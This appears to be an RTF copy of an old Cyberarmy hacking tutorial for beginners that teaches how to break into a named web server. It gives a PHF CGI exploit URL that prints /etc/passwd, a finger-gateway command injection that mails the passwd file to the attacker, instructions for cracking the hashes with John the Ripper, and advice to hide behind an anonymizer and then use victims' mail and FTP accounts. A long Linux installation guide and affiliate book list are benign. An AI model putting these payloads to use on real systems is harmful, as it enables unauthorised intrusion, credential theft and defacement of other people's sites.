+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Ok, I'm In\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, stupid thing won't let me in\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\pard\sb100\sa100\qc\f2\fs18 ANCIENT CHINESE FTP METHOD:\f1\fs24\par
+\pard\sb100\sa100\f2\fs18 Now you are connected to froggy.com.au \rquote s FTP server, click on their \\etc directory.\f1\fs24\par
+\f2\fs18 You should see a file called \lquote passwd\rquote  and maybe a file called \lquote group\rquote . Download the \lquote passwd\rquote  file, and \line look at it.\f1\fs24\par
+\f2\fs18 If it looks like this when you open it, you are in luck:\line\line root:2fkbNba29uWys:0:1:Operator:/:/bin/csh\line admin:rYsKMjnvRppro:100:11:WWW administrator:/home/Common/WWW:/bin/csh\line kangaroo:3A62i9qr:1012:10:Hisaharu\line [etc.]\line\line For example, we know a login is \ldblquote kangaroo\rdblquote  and their encrypted password is \ldblquote 3A62i9qr\rdblquote . Note - this is not their password, but an encrypted form of their password.\line\line Or, did it look more like this:\line\line root:*:0:1:Operator:/:/bin/csh\line admin:*:100:11:WWW administrator:/home/Common/WWW:/bin/csh\line kangaroo:*:1012:10:Hisaharu TANAKA:/home/user/kangaroo:/usr/local/bin/tcsh\line\line Is the second, encrypted password, section replaced by *\rquote s or x\rquote s? This is bad \endash  it is called a shadowed \line password and cannot be decrypted. This is how most passwd files are now days. However, if you got a \line passwd file which has some non-shadowed entries, you can put your hand to decrypting it.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, It was all shadowed\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, couldn't find the passwd file in the first place\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Yes! I think I got some non-shadowed passwords\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 DECRYPTING PASSWD FILES:\line\line There are a few programs around which were written to decrypt Unix passwd files. The most famous one was called \lquote Cracker Jack\rquote . Many \lquote hacking\rquote  texts strongly recommend this file \endash  but they are mostly talking rubbish. Its old and most systems will just crash when they try to run it, as it uses weird memory allocation.\f1\fs24\par
+\f2\fs18 The best Unix cracker around is currently called 'John the Ripper 1.5\rquote . It is readily avaliable. It was only written in the last year or so, and is a lot faster than Cracker Jack ever was. John the Ripper was also designed with Pentiums in mind, and the brute force techique used is genius. But you have to go down to DOS to use it.\f1\fs24\par
+\f2\fs18 You will also need a large \lquote wordfile\rquote , with every English word. Bigger the better. The Crack Programs test every word in the wordfile against the passwd file. If the wordfile is big enough, you have a good chance of getting a password.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Yes! I Got Me Some Decrypted Passwords!\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, the Encryption was too Good\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Give me some reading about all the different password crackers, where to find them, etc. <http://www.cyberarmy.com/tute/htext4.shtml>\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 THE OLD-STYLE PHF TECHNIQUE:\f1\fs24\par
+\f2\fs18 Although most servers have now trashed a program called PHF, let's just make sure... It is is working, it lets you get the passwd file remotely, even if it is inside hidden and root access only directories.\f1\fs24\par
+\cf2\f2\fs18 In the Overlord Anonymizer, type:\cf0\f1\par
+\cf2\f2 http://www.froggy.com.au /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd.\cf0\f1\fs24\par
+\pard\brdrb\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Top of Form 4\par
+\trowd\trqc\trbrdrb\brdrdb\brdrw10 \cellx1450\cellx2900\pard\intbl\cf2\v0\f2\fs24 OVERLORD ANONYMIZER\cf3  \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs24\cell\row
+\pard\brdrt\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Bottom of Form 4\par
+\pard\sb100\sa100\qc\v0\f2\fs18 If PHF is active (often not), this string will print out the etc/passwd file strait to your web browser all you need to do is save it as a file and again run a crack program against it.\f1\fs24\par
+\pard\sb100\sa100\f2\fs18 Now, if you see the words 'Smile! You're on Candid Camera!', it means that the server is protected against this hack, and has logged your IP. But don't worry. So long as you were using the anonymizer, you are safe.\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, they fixed that PHF Bug Problem\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Yes! I Got Me Some Encrypted Passwords!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 FINGER BOX HACKING:\f1\fs24\par
+\f2\fs18 Finger servers are hacker's friends. Let's find out whether www.froggy.com.au \cf2 has a finger server.\cf0\f1\par
+\cf2\f2 In the Anonymizer, assuming that the server's name starts with www, type www.\cf0 froggy.com.au \cf2 /cgi-bin/finger\cf0\f1\par
+\pard\brdrb\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Top of Form 5\par
+\trowd\trqc\trbrdrb\brdrdb\brdrw10 \cellx1450\cellx2900\pard\intbl\cf2\v0\f2\fs18 OVERLORD ANONYMIZER\cf3  \cf0\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs18\cell\f0\fs20{\pict\wmetafile8\picw635\pich635\picwgoal360\pichgoal360 
+0100090000034c00000003001c00000000000400000003010600050000000c027b027b02070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffccc113002942c877040000002d010200030000000000
+}\f1\fs18\cell\row
+\pard\brdrt\brdrdb\brdrw10\brdrcf2 \sb100\sa100\qc\v\f0\fs16 Bottom of Form 5\par
+\pard\sb100\sa100\qc\cf2\v0\f2\fs18 If the finger gateway is operational a box should appear for you to enter the name you want to finger. If it is operational you have another chance to receive the etc/passwd file.\cf0\f1\par
+\pard\sb100\sa100\cf2\f2 Okay, 1/ get your list of e-mail addresses you found for the site (let's pretend one of them is "kangaroo@\cf0 froggy.com.au \cf2 ", and that your email address is "your@email.org")\cf0\f1\par
+\cf2\f2 2/ Go back to the finger box, and type this in (changing these email addresses for the real ones):\cf0\f1\par
+\cf2\f2 kangaroo@\cf0 froggy.com.au \cf2 ; /bin/mail your@email.org < etc/passwd\cf0\f1\par
+\cf2\f2 This takes the passwd file through \cf0 kangaroo@froggy.com.au and emails it to your email address. If this works you now have the etc/passwd file in your mailbox.... you can now run a crack program against it and have a little fun on their box.\f1\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, it didn't work\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Yes! I Got Me Some Encrypted Passwords!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\cf2\f2\fs18 LINUX INSTALLATION\cf0\f1\fs24\par
+\cf2\f2\fs18 All the above really has given you the basic ideas. To do anything firther, and impliment any real exploits, you will have to put a Linux operating system on your computer. Below are some instructions on how to quickly and easily install Linux on your computer. You can just download the files below for free, and install them in a directory on your MS-DOS / Windows system! That's right, you dont even have to repartition your Hard Drive!\cf0\f1\fs24\par
+\cf2\f2\fs18 Okay... I will make this as basic and free as possible. I will assume you are running Windows 95 or 98 and have never seen Linux before. You have a Hard Drive with at least 100MB free. Youve got a floppy drive, etc. You know how to unzip files. And you dont want to spend any money. Luckily, Linux is free and easy to set up.\cf0\f1\fs24\par
+\cf2\f2\fs18 1/ \cf1\ul Download this file <ftp://sunsite.anu.edu.au/pub/linux/distributions/slackware/zipslack/zipslack.zip>\cf2\ulnone  (Australia). It's big, like 34MB. But it's all you need. If the site there is overloaded, get it \cf1\ul here <ftp://ftp.cdrom.com/pub/linux/slackware/zipslack/zipslack.zip>\cf2\ulnone .\cf0\f1\fs24\par
+\cf2\f2\fs18 2/ What you have is a version of Slackware Linux, called zipslack. It's a very simple version of Slackware Linux to set up. I don't use Slackware, and there are some better versions around now - like RedHat 5.2. But, it is a good stable version - and, like I say, very simple to download and setup. Good for a Linux test drive.\cf0\f1\fs24\par
+\cf2\f2\fs18 3/ Ok, make a directory called 'Linux' on your Hard Drive. That's right, with this distro, you dont even have to repartition your drive. It can be on the same Hard Drive you have Windows on! (I told you this would be easy). Just make sure its a major directory on your hard drive, like c:\\linux - not in a subdirectory anywhere.\cf0\f1\fs24\par
+\cf2\f2\fs18 4/ Now, just unzip all the contents of the zipslack.zip into the right directories, like c:\\linux\\etc, c:\\linux\\usr, etc.\cf0\f1\fs24\par
+\cf2\f2\fs18 5/ Now, heres the hardest part. You will have to edit the \\linux\\linux.bat file. Open it in an editor.\cf0\f1\fs24\par
+\cf2\f2\fs18 6/ You'll need to edit the LINUX.BAT file, and make sure the root=/dev/XXXX points to your Hard Drive. If you have put it on your main hard drive, you can make the line:\cf0\f1\fs24\par
+\pard\li360\ri360\sb100\sa100\cf2\f2\fs18\\linux\\loadlin \\linux\\vmlinuz root=/dev/hda1 (hda1 means the IDE1 Master HDD)\cf0\f1\fs24\par
+\pard\sb100\sa100\cf2\f2\fs18 I have Linux on my drive D: (the IDE2 Master HDD), and for me the line would be:\cf0\f1\fs24\par
+\pard\li360\ri360\sb100\sa100\cf2\f2\fs18\\linux\\loadlin \\linux\\vmlinuz root=/dev/hdc1\cf0\f1\fs24\par
+\pard\sb100\sa100\cf2\f2\fs18 7/ If you are unsure, the Linux.bat file has a long list of examples. Just guess. If you get it wrong, you'll still be able to use scrollback (right shift key and PageUp) when the kernel halts to go back and look at your partitions, noting the names Linux gives them. With this information, you should be able to edit the LINUX.BAT correctly.\cf0\f1\fs24\par
+\cf2\f2\fs18 8/ Well, I skipped ahead of myself. You are now (already) ready to boot up your Linux system. Who said it was hard?\cf0\f1\fs24\par
+\cf2\f2\fs18 9/ Ok, you must go 'Shut Down' and 'Restart in MS-DOS Mode'. Then just go to the \\Linux directory ('cd linux') and run Linux.bat\cf0\f1\fs24\par
+\cf2\f2\fs18 10/ The Linux system will load itself over MS-DOS (though you don't need to load it over DOS - later you can make a boot-disk so only linux loads).\cf0\f1\fs24\par
+\cf2\f2\fs18 11/ You will see a whole lot of stuff loading. Then you will see a login: prompt.\cf0\f1\fs24\par
+\cf2\f2\fs18 12/ You have an operating system just like all the big net servers have!\cf0\f1\fs24\par
+\cf2\f2\fs18 13/ Okay, just type in 'root', and you have root access on the system. You will want to give yourself a password, so type 'passwd'. Choose something you will remember. Without it, you cannot log in.\cf0\f1\fs24\par
+\cf2\f2\fs18 14/ Now you will have a black screen with a # looking at you. Dont let that worry you - its just like a MS-DOS screen. A few commands for now: 'ls' (like 'dir' in MS-DOS), 'cd' (change directory, like dos), 'pico' (an editor, use like 'pico text.txt'), and 'mc' (this is a nice menu program that comes with zipslack).\cf0\f1\fs24\par
+\cf2\f2\fs18 15/ Now, type 'setup'.\cf0\f1\fs24\par
+\cf2\f2\fs18 16/ Setup your mouse, network settings, screen stuff. Really easy. Just like - 'are you using a 2 button mouse or 3'? Easy.\cf0\f1\fs24\par
+\cf2\f2\fs18 17/ Now, if you want net access, through this - type 'pppsetup'. This starts the ppp (point to point protocol) setup. You will need to know all your internet settings, like your Gateway, Nameserver numbers, etc. If you dont know these, go back to windows and see what values you used from the Control Panel : Internet section.\cf0\f1\fs24\par
+\cf2\f2\fs18 18/ Okay. Reboot. Your mouse should be working, with some luck. Hopefully, your modem will be able to dial. Though, often not. If you have a standard external modem on Com 2, it is probably okay. Otherwise, it's sometimes a pain to configure your modem for Linux.\cf0\f1\fs24\par
+\cf2\f2\fs18 19/ If you are having modem troubles, type 'mc to run the Midnight Commander. Open the 'etc' directory, then 'rc.d', then 'serials.rc'. Comment out the auto config section with '#' signs. And go to the manual config section. Uncomment /dev/cua0 (Com 1:) and /dev/cua1 (Com 2:) - or /dev/cua2 or cua3 (Com 3: or 4:) for internal modem users. Now, from windows, go to Accessories:System Tools:System Information (Win 98) to get the IRQ and Port Settings for your modem. If you are in Win95, I think you have to run something called msd.com in the \\windows directory. Put these setting in. Then, edit S.rc and at the bottom, uncomment the place where it says to call the serials.rc file.\cf0\f1\fs24\par
+\cf2\f2\fs18 20/ If you have a CD-Rom you can also edit S.rc so that it checks for a CD Rom during bootup.\cf0\f1\fs24\par
+\cf2\f2\fs18 21/ All things going well, you should now have a fully functional Unix type system on your computer. You can download all your latest little X-Crush programs (in .tgz format). To setup Software - say a Linux stealth port scanner, save the .tgz file in a directory and run 'pkgtool'. Then go 'install file'. Real easy. If it is a C program, type 'gcc program.c' to compile it.\cf0\f1\fs24\par
+\cf2\f2\fs18 22/ Well, you are missing a Windows type interface. You dont need one. But if you want to surf using Linux, etc. It is better to have a graphical interface - although you can run a browser called 'lynx' just through the vanilla Linux interface.\cf0\f1\fs24\par
+\cf2\f2\fs18 23/ You can get some things, like X-Windows from ftp.cdrom.com/pub/linux/slackware/slakware/x1/\cf0\f1\fs24\par
+\cf2\f2\fs18 24/ Just get all the files that look vital (about 8 of them), and run pkgtool to install them all. You will probably find that setting up X-Win for the first time is a huge pain. It was for me at least - you need to know, for example, the horizontal and vertical refresh rates of your monitor. Then, get something like the Linux Netscape, or Arena as a browser. These run thru X-Windows.\cf0\f1\fs24\par
+\cf2\f2\fs18 25/ You will have fun tweaking everything as you like it. There are dozens of windows interfaces to choose from. Some looks almost identical to Win95.\cf0\f1\fs24\par
+\cf2\f2\fs18 26/ Where from here? You can now do practically anything - you basically have all the net power your ISP does, except for all the phone lines. You can let people use you as a dial up ISP, you can host web pages and set up FTP sites to run from your computer. You can set up email addresses, nameservers... anything.\cf0\f1\fs24\par
+\cf2\f2\fs18 27/ Because Linux is the same software as most ISPs run, a lot of hackers use Linux. You will be able to issue commands to other servers. You can ask other servers about themselves. For example, type 'showmount -e victim.com'. You can also run things like 'ping', and 'traceroute' directly from your command line. You can send mail from your own sendmail program so that it is untraceable.\cf0\f1\fs24\par
+\cf2\f2\fs18 Some last incentives, if you were brought up in the Windows world and are afraid of command prompts, just type 'mc'. The zipslack distro comes with this 'Midnight Commander' - which I use a lot. And play a few games on the things. There are a few old favourites installed by default - like 'trek', and 'adventure', etc. If you were in computers 20 years ago, you will know what I mean. The games directory is in usr/games.\cf0\f1\fs24\par
+\cf2\f2\fs18 If you have got any more problems, there are a lot of people on the IRC #Linux channel on undernet who are very helpful. If your Linux is set up to the net, you can run the Linux Bitch-X IRC program to get there. Zipslack also has pine (for email), tin (for newsgroups), and lynx (for surfing).\cf0\f1\fs24\par
+\cf2\f2\fs18 Fact is, when you got this all working for a few weeks (and probably loving it), you will no doubt like to try some more advanced Linux distros. Although there are a lot of personal feelings about various distributions, I recommend RedHat 5.2 Linux. You will find it very easy to install.\cf0\f1\fs24\par
+\cf2\f2\fs18 If you are happy buying through Amazon.Com, \cf1\ul here is <http://www.amazon.com/exec/obidos/ASIN/0789717468/thenewbiesarea>\cf2\ulnone  the best Linux deal I've been able to find anywhere. It deals with the 3 major Linux distributions: Red Hat, Slackware, and Debian - with 3 CDs. It also contains a very good install guide. All for about half the price of the single 'official' RedHat CD. If you like this Linux stuff, I recommend you get it - or at least make sure you get a book that is written very recently.\cf0\f1\fs24 [an error occurred while processing this directive]\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [\cf1\ul Nah, it didn't work\cf0\ulnone ]\f1\fs24\par
+\f2\fs18 [\cf1\ul Yes! I Got Me Some Encrypted Passwords!\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 CURRENT LIMIT:\f1\fs24\par
+\f2\fs18 You have reached the current limit of the tutorials.... I will add further steps when I get the time and if people like these lessons. Also, if people want to write sections up for this, just mail the sections to me, to the e-mail address listed at Cyberarmy.Com.\f1\fs24\par
+\f2\fs18 Until this gets bigger, I can suggest a few books that teach hacking. I've found that a lot of books are rubbish and just teach how to change screen colours, but there are a few that every hacker should have in their library.\f1\fs24\par
+\cf2\f2\fs18 THE ESSENTIAL HACKER'S LIBRARY:\cf0\f1\fs24\par
+\cf2\f2\fs18 ESSENTIAL BOOKS:\cf0\f1\fs24\par
+\cf2\f2\fs18 1. \cf1\ul MAXIMUM SECURITY <http://www.amazon.com/exec/obidos/ASIN/1575212684/thenewbiesarea>\cf2\ulnone : Of course, Maximum Security has to be at number one. I guess this would probably be the central book in any hacker's library. Goes through a heap of techniques like a textbook with over 900 pages.\cf0\f1\fs24\par
+\cf2\f2\fs18 2. \cf1\ul THE HAPPY HACKER <http://www.amazon.com/exec/obidos/ASIN/0929408217/thenewbiesarea>\cf2\ulnone : Essential for newbies. Although this book is bagged a lot by people who hate Carolyn, I think most people agree it would be the perfect first book a newbie should read. Explains things pretty well, spelling mistakes, but probably an essential newbie primer. Thou, as I say, if you know your stuff you can safely forget this one.\cf0\f1\fs24\par
+\cf2\f2\fs18 ESSENTIAL SOFTWARE:\cf0\f1\fs24\par
+\cf2\f2\fs18 1. \cf1\ul LINUX <http://www.amazon.com/exec/obidos/ASIN/0789717468/thenewbiesarea>\cf2\ulnone : You will \i need\i0  to change to Linux to do any serious hacking. But thankfully, it is fairly simple and you can just set up Linux in a seperate partition on your Hard Drive and set for a dual boot option: usually windows, and when you are hacking, Linux. You amount of 'Net Power' increases 500%. If you want to buy Linux, make sure you get the latest version not an obsolete one. There are also several different 'flavours' of Linux, you will probably want to start with RedHat, then possibly move to Slackware after a year or so. So, make sure you get a deal which gives you the oportunity to check out some of the different distributions. \i By far\i0  the best Linux deal I've found around \cf1\ul is this one <http://www.amazon.com/exec/obidos/ASIN/0789717468/thenewbiesarea>\cf2\ulnone . It has an excellent Linux manual, and comes with three seperate Linux distributions on 3 CDs, including the very latest RedHat \i and\i0  Slackware. It's also excellent value (about half the price of buying the single 'official' RedHat CD).\cf0\f1\fs24\par
+\cf2\f2\fs18 NOT ESSENTIAL, BUT RECOMMENDED BOOKS:\line (These books are mainly just part of the Hacker Culture)\cf0\f1\fs24\par
+\cf2\f2\fs18 3. \cf1\ul THE WATCHMAN <http://www.amazon.com/exec/obidos/ASIN/0316528579/thenewbiesarea>\cf2\ulnone : The Twisted Life and Crimes of Serial Hacker Kevin Poulsen: This one will not teach you anything, so stuff it if you just want to learn. Although it was one of the best reads I ever had. More like a thriller book, but it was real! The Kevin Mitnick books are about the same, but this one deals a lot with phreaking, and scamming radio stations of cars. But, as I say, it doesn't go through any techniques, so stuff it if you just want to learn stuff.\cf0\f1\fs24\par
+\cf2\f2\fs18 4. \cf1\ul THE FUGITIVE GAME <http://www.amazon.com/exec/obidos/ASIN/0316528692/thenewbiesarea>\cf2\ulnone : Online With Kevin Mitnick: Again, a really fun read (though, I prefer the Poulsen book) but it doesn't go through any hacking techniques. But I have to list it here because it is such a good read. It's also a really cheap buy.\cf0\f1\fs24\par
+\cf2\f2\fs18 5. \cf1\ul TAKEDOWN <http://www.amazon.com/exec/obidos/ASIN/0786889136/thenewbiesarea>\cf2\ulnone  : The Pursuit and Capture of Kevin Mitnick: This is the other side of the Mitnick story (written by the cops who chased him). Interesting, but the essential Mitnick book is the one above. Though, this is a very good primer on how the FBI operates to capture hackers. But, again, no techniqes listed. For techniques, you would only have luck in the first two books listed.\cf0\f1\fs24\par
+\cf2\f2\fs18 Okay, as for programming books - stuff it. You can download the things for free if you search for "perl + programming + tutorial" and things like that. Unless you like printed books, forget that. So, the only other thing is Linux. You will need to have Linux as a dual boot option on your PC if you want to do any serious hacking.\cf0\f1\fs24\par
+\cf2\f2\fs18 Some books that suck: these are some books that are going around that are a rip-off. \cf1\ul SECRETS OF A SUPER HACKER <http://www.amazon.com/exec/obidos/ASIN/1559501065/thenewbiesarea>\cf2\ulnone : This is another book that a lot of people have. The book seemed like a real waste of time to me.\cf0\f1\fs24\par
+\cf2\f2\fs18 So, keep going through this tutorial as it gets bigger, read anything you find on the web. Get some of the major books above, at least 1 and 2, and read them very carefully - four or five times. Join your local Linux users group, if you have one. And, later on, download a few guides on programming and read through them when you get some time. With some effort (it isn't easy), you can become a respected hacker and take control of the Net.\cf0\f1\fs24\par
+\pard\sb100\sa100\qc\f0\fs20{\pict\wmetafile8\picw3175\pich1058\picwgoal1800\pichgoal600 
+0100090000035e00000003001c00000000000400000003010600050000000c022204670c070000
+00fc020000000000000000040000002d01000008000000fa020000000000000000000004000000
+2d0101001c000000fb020c00090000000000900100000000000202024d532053616e7320536572
+6966008a0100000000ffffffffd4c113002942c877040000002d01020012000000210517006368
+6f696365732e6769662028353338206279746573290028ffd500030000000000
+}\f1\fs24\par
+\f2\fs18 [Back to \cf1\ul Index\cf0\ulnone ]\f1\fs24\par
+\pard\sb100\sa100\par
+\f2\fs18 CONGRATULATIONS:\f1\fs24\par
+\f2\fs18 You have gained access.\f1\fs24\par
+\f2\fs18 If you now have the login code and password, you may use the users mail account, FTP priviliges (change their web pages by uploading new ones), and HTTP access.\f1\fs24\par
+\f2\fs18 (If you have only got access to a user level account, do not despair. If you have a user level account, it is easy to use that to later get a root level account. More on this when this study is made bigger).\line\f1\fs24\par
+\pard\f0\fs20\par
+}
+ 
